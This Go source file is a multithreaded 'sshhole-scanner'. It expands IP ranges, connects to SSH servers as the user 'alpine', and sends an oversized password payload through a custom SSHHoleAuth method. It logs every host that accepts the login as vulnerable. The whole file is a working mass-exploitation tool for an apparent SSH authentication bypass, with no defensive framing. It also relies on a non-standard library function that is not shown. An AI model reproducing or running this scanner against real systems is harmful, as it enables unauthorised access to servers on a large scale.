package main

import (
	"bufio"
	"encoding/binary"
	"flag"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/crypto/ssh"
)

type Config struct {
	TargetsFile string
	RangeStr    string
	Port        int
	OutputFile  string
	Username    string
	Threads     int
	Timeout     time.Duration
	Length      int
	Verbose     bool
}

type SafeWriter struct {
	mu   sync.Mutex
	file *os.File
}

func (w *SafeWriter) Write(target string) error {
	w.mu.Lock()
	defer w.mu.Unlock()
	_, err := fmt.Fprintf(w.file, "%s\n", target)
	if err != nil {
		return err
	}
	return w.file.Sync()
}

func ipToUint32(ip net.IP) uint32 {
	ip = ip.To4()
	if ip == nil {
		return 0
	}
	return binary.BigEndian.Uint32(ip)
}

func uint32ToIP(n uint32) net.IP {
	ip := make(net.IP, 4)
	binary.BigEndian.PutUint32(ip, n)
	return ip
}

func expandCIDR(cidrStr string, port int) ([]string, error) {
	ip, ipNet, err := net.ParseCIDR(cidrStr)
	if err != nil {
		return nil, err
	}
	start := ipToUint32(ip.Mask(ipNet.Mask))
	mask := binary.BigEndian.Uint32(ipNet.Mask)
	broadcast := start | ^mask

	var ips []string
	for cur := start; cur <= broadcast; cur++ {
		curIP := uint32ToIP(cur)
		ips = append(ips, fmt.Sprintf("%s:%d", curIP.String(), port))
	}
	return ips, nil
}

func expandDashRange(dashStr string, port int) ([]string, error) {
	parts := strings.Split(dashStr, "-")
	if len(parts) != 2 {
		return nil, fmt.Errorf("invalid range: %s", dashStr)
	}
	startIP := net.ParseIP(strings.TrimSpace(parts[0])).To4()
	if startIP == nil {
		return nil, fmt.Errorf("invalid start IP: %s", parts[0])
	}

	var endIP net.IP
	endStr := strings.TrimSpace(parts[1])
	if strings.Contains(endStr, ".") {
		endIP = net.ParseIP(endStr).To4()
	} else {
		lastOctet, err := strconv.Atoi(endStr)
		if err != nil || lastOctet < 0 || lastOctet > 255 {
			return nil, fmt.Errorf("invalid end octet: %s", endStr)
		}
		endIP = make(net.IP, 4)
		copy(endIP, startIP)
		endIP[3] = byte(lastOctet)
	}

	if endIP == nil {
		return nil, fmt.Errorf("invalid end IP: %s", endStr)
	}

	startNum := ipToUint32(startIP)
	endNum := ipToUint32(endIP)
	if startNum > endNum {
		return nil, fmt.Errorf("start IP greater than end IP")
	}

	var ips []string
	for cur := startNum; cur <= endNum; cur++ {
		ips = append(ips, fmt.Sprintf("%s:%d", uint32ToIP(cur).String(), port))
	}
	return ips, nil
}

func parseRange(raw string, defaultPort int) ([]string, error) {
	var targets []string
	for _, entry := range strings.Split(raw, ",") {
		entry = strings.TrimSpace(entry)
		if entry == "" {
			continue
		}

		port := defaultPort
		if strings.Contains(entry, "/") && strings.Contains(entry, ":") {
			idx := strings.LastIndex(entry, ":")
			if p, err := strconv.Atoi(entry[idx+1:]); err == nil && p > 0 && p <= 65535 {
				port = p
				entry = entry[:idx]
			}
		} else if !strings.Contains(entry, "/") && strings.Count(entry, ":") == 1 {
			parts := strings.Split(entry, ":")
			if p, err := strconv.Atoi(parts[1]); err == nil && p > 0 && p <= 65535 {
				port = p
				entry = parts[0]
			}
		}

		if strings.Contains(entry, "/") {
			expanded, err := expandCIDR(entry, port)
			if err != nil {
				return nil, err
			}
			targets = append(targets, expanded...)
		} else if strings.Contains(entry, "-") {
			expanded, err := expandDashRange(entry, port)
			if err != nil {
				return nil, err
			}
			targets = append(targets, expanded...)
		} else {
			if ip := net.ParseIP(entry); ip != nil {
				targets = append(targets, fmt.Sprintf("%s:%d", ip.String(), port))
			} else {
				targets = append(targets, fmt.Sprintf("%s:%d", entry, port))
			}
		}
	}
	return targets, nil
}

func parseFlags() Config {
	var cfg Config
	flag.StringVar(&cfg.TargetsFile, "f", "", "Targets file (ip:port per line)")
	flag.StringVar(&cfg.RangeStr, "r", "", "IP range or CIDR (e.g. 192.168.1.0/24, 10.0.0.1-50)")
	flag.IntVar(&cfg.Port, "p", 22, "Default port for range scan (default: 22)")
	flag.StringVar(&cfg.OutputFile, "o", "vulnerable.txt", "Output file for vulnerable targets")
	flag.StringVar(&cfg.Username, "u", "alpine", "Target username (default: alpine)")
	flag.IntVar(&cfg.Threads, "t", 50, "Threads count (default: 50)")
	timeoutSec := flag.Int("timeout", 5, "Timeout in seconds (default: 5)")
	flag.IntVar(&cfg.Length, "len", 300, "Payload password length (default: 300)")
	flag.BoolVar(&cfg.Verbose, "v", false, "Verbose output")
	flag.Parse()

	cfg.Timeout = time.Duration(*timeoutSec) * time.Second

	if cfg.TargetsFile == "" && cfg.RangeStr == "" {
		fmt.Println("Usage: ./sshhole-scanner [-f targets.txt] [-r range] [-u user] [-o out.txt]")
		flag.PrintDefaults()
		os.Exit(1)
	}

	return cfg
}

func normalizeTarget(line string, defaultPort int) string {
	line = strings.TrimSpace(line)
	if line == "" || strings.HasPrefix(line, "#") {
		return ""
	}
	if !strings.Contains(line, ":") {
		return fmt.Sprintf("%s:%d", line, defaultPort)
	}
	return line
}

func checkTarget(target string, cfg *Config) bool {
	// first probe to cache salt, then oversized payload
	probe := "probe_salt_init"
	payload := strings.Repeat("A", cfg.Length)

	sshConfig := &ssh.ClientConfig{
		User: cfg.Username,
		Auth: []ssh.AuthMethod{
			ssh.SSHHoleAuth(probe, payload),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         cfg.Timeout,
	}

	conn, err := net.DialTimeout("tcp", target, cfg.Timeout)
	if err != nil {
		if cfg.Verbose {
			fmt.Printf("[-] %s: connection error: %v\n", target, err)
		}
		return false
	}
	defer conn.Close()

	sshConn, chans, reqs, err := ssh.NewClientConn(conn, target, sshConfig)
	if err != nil {
		if cfg.Verbose {
			fmt.Printf("[-] %s: rejected: %v\n", target, err)
		}
		return false
	}
	_ = sshConn.Close()
	go ssh.DiscardRequests(reqs)
	_ = chans

	return true
}

func main() {
	cfg := parseFlags()

	var targets []string
	seen := make(map[string]bool)

	// load targets
	if cfg.TargetsFile != "" {
		f, err := os.Open(cfg.TargetsFile)
		if err != nil {
			fmt.Fprintf(os.Stderr, "error opening file%v\n", err)
			os.Exit(1)
		}
		scanner := bufio.NewScanner(f)
		for scanner.Scan() {
			if t := normalizeTarget(scanner.Text(), cfg.Port); t != "" && !seen[t] {
				seen[t] = true
				targets = append(targets, t)
			}
		}
		f.Close()
	}

	// load targets from range
	if cfg.RangeStr != "" {
		expanded, err := parseRange(cfg.RangeStr, cfg.Port)
		if err != nil {
			fmt.Fprintf(os.Stderr, "error parsing range: %v\n", err)
			os.Exit(1)
		}
		for _, t := range expanded {
			if !seen[t] {
				seen[t] = true
				targets = append(targets, t)
			}
		}
	}

	if len(targets) == 0 {
		fmt.Println("no targets loaded")
		return
	}

	outFile, err := os.OpenFile(cfg.OutputFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error opening output file: %v\n", err)
		os.Exit(1)
	}
	defer outFile.Close()

	writer := &SafeWriter{file: outFile}
	queue := make(chan string, cfg.Threads*2)
	var wg sync.WaitGroup
	var scanned int64
	var vulnerable int64

	// start workers
	for i := 0; i < cfg.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for target := range queue {
				if checkTarget(target, &cfg) {
					atomic.AddInt64(&vulnerable, 1)
					fmt.Printf("[+] %s\n", target)
					_ = writer.Write(target)
				}
				atomic.AddInt64(&scanned, 1)
			}
		}()
	}

	// feed workers
	for _, t := range targets {
		queue <- t
	}
	close(queue)

	wg.Wait()

	fmt.Printf("done: %d scanned, %d vulnerable (saved to %s)\n", scanned, vulnerable, cfg.OutputFile)
}
